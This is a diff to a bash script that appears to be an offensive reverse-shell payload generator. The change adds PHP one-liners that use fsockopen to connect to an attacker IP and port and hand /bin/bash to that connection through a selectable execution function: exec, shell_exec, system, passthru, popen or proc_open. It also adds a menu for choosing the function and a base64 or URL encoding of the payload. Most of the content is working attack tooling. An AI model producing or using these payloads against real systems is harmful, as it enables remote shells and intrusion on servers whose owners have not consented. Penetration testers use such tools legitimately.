@@ -4,7 +4,7 @@
 #Mastadon: 4ndr34z@infosec.exchange
 #Web: https://f20.be
 
-version="1.5.5"
+version="1.5.6"
 
 ### Colors ##
 ESC=$(printf '\033') RESET="${ESC}[0m" BLACK="${ESC}[30m" RED="${ESC}[31m"
@@ -1608,14 +1608,18 @@ then
     PORT=$ngrokPORT
 fi
 header
-if [[ $2 == "" ]]
+echo "function: $efunc"
+if [ "$efunc" == "popen" ]
 then
-    exec="exec"
+    rev="php -r '\$sock=fsockopen(\"$IP\",$PORT);popen(\"$nshell<&3 >&3 2>&3\", \"r\");'"
+elif [ "$efunc" == "proc_open" ]
+then
+    rev="php -r '\$sock=fsockopen(\"$IP\",$PORT);\$proc=proc_open(\"$nshell\", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);'"
 else
-    exec=$2
+    rev="php -r '\$sock=fsockopen(\"$IP\",$PORT);\$c=\"$nshell <&3 >&3 2>&3\";$efunc("\$c");'"
 fi
 
-rev="php -r '\$sock=fsockopen(\"$IP\",$PORT);\$c=\"$nshell <&3 >&3 2>&3\";$exec("\$c");'"
+
 
 if [[ $1 == "url" ]] 
 then
@@ -2195,24 +2199,73 @@ Choose an option:  "
     esac
 }
 
+
+submenu_phpfunctions() {
+header
+    echo -ne "
+$(blueprint 'PHP execute functions')
+$(greenprint '1)') exec 
+$(greenprint '2)') shell_exec 
+$(greenprint '3)') system
+$(greenprint '4)') passthru
+$(greenprint '5)') popen
+$(greenprint '6)') proc_open
+$(magentaprint 'b)') Go Back
+
+Choose an option:  "
+    read -r -n 1 ans
+    case $ans in
+    1)
+        efunc="exec"
+        submenu_php
+        ;;
+    2)
+        efunc="shell_exec"
+        submenu_php
+        ;;
+    3)
+        efunc="system"
+        submenu_php
+        ;;
+    4)
+        efunc="passthru"
+        submenu_php
+        ;;
+    5)
+        efunc="popen"
+        submenu_php
+        ;;
+    6)
+        efunc="proc_open"
+        submenu_php
+        ;;
+
+    b)
+        submenu_php
+        ;;
+    esac
+}
+
 submenu_php() {
 if [ "$nshell" == "" ]
 then
     nshell="/bin/bash"
 fi
+
+if [ "$efunc" == "" ]
+then
+    efunc="exec"
+fi
 header
     echo -ne "
 $(blueprint 'PHP')
-$(greenprint '1)') exec No encoding
-$(greenprint '2)') exec Base64 encoded
-$(greenprint '3)') exec URL encoded
-$(greenprint '4)') exec Double URL encoded
-$(greenprint '5)') system No encoding
-$(greenprint '6)') system Base64 encoded
-$(greenprint '7)') system URL encoded
-$(greenprint '8)') system Double URL encoded\n\n
+$(greenprint '1)') No encoding
+$(greenprint '2)') Base64 encoded
+$(greenprint '3)') URL encoded
+$(greenprint '4)') Double URL encoded\n\n
 $(cyanprint "OPTIONS")
-$(greenprint 's)') Which shell [$nshell]
+$(greenprint 's)') Shell [$nshell]
+$(greenprint 'f)') Function [$efunc]
 $(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 
@@ -2231,18 +2284,6 @@ Choose an option:  "
     4)
         php "urlx2"
         ;;
-    5)
-        php "" "system"
-        ;;
-    6)
-        php "base64" "system"
-        ;;
-    7)
-        php "url" "system"
-        ;;
-    8)
-        php "urlx2" "system"
-        ;;
     s)
         echo ""
         oshell="/bin/bash"
@@ -2250,6 +2291,10 @@ Choose an option:  "
         nshell=${nshell:-$oshell}
         submenu_php
         ;;
+    f)  
+        submenu_phpfunctions
+        ;;
+
     m)
         mainmenu
         ;;
